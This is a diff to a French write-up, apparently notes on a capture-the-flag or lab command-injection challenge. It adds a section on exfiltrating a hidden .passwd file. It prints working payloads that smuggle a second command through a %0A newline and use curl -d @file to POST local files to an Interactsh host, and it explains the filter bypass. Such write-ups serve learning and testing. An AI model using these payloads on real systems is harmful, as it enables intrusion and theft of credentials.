@@ -711,10 +711,27 @@ Ou bien la manière dont la commande est envoyée (par ex. via HTTP param) empê
 - Cela évite d’avoir à appeler cat ou faire de la substitution.
 `ip=127.0.0.1%0acurl -X POST -d @index.php http://burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun`
 
+<img width="2434" height="1090" alt="Capture d’écran 2025-12-03 à 22 16 29" src="https://github.com/user-attachments/assets/a5e61a64-5375-4a00-b196-6e5a0c419cac" />
+
+
 <img width="2938" height="1422" alt="Capture d’écran 2025-12-03 à 17 13 05" src="https://github.com/user-attachments/assets/7f1e2134-2fda-4786-aa16-72896311b005" />
 
 → Aucun backtick, pas de substitution, la seule « nouveauté » est le flag -d @file qui est interprété par curl, et curl lit le fichier localement.
 → Les espaces à l’intérieur de la commande curl -X POST -d @file sont acceptés car ils sont sur la nouvelle ligne et le parser ne les bloque pas dans ce contexte — la raison technique exacte dépend du filtre (parfois seul le paramètre GET est filtré d’une certaine façon, tandis que la ligne suivante est interprétée différemment).
+
+### Exfiltrer le fichier caché .passwd
+Payload final que tu as utilisé :
+`ip=127.0.0.1%0Acurl -X POST -d @.passwd burfmgxiiuvqxzqjxaeet88lp3emf7ixn.oast.fun`
+
+- curl lit `.passwd` et envoie son contenu en POST à l’URL fournie ( domaine Interactsh).
+- Dans Interactsh → HTTP logs on voit la requête et le corps, souvent URL-encoded.
+- Après décodage, tu récupères le mot de passe.
+- Évite cat et backticks (souvent filtrés).
+- Exploite la capacité native de curl à lire un fichier via -d @file.
+- Exploite le newline bypass %0A qui est le pivot pour exécution.
+
+<img width="2934" height="1406" alt="Capture d’écran 2025-12-03 à 22 25 03" src="https://github.com/user-attachments/assets/a01e5330-148b-4116-9f87-a8d1a5a2badf" />
+
 
 
 
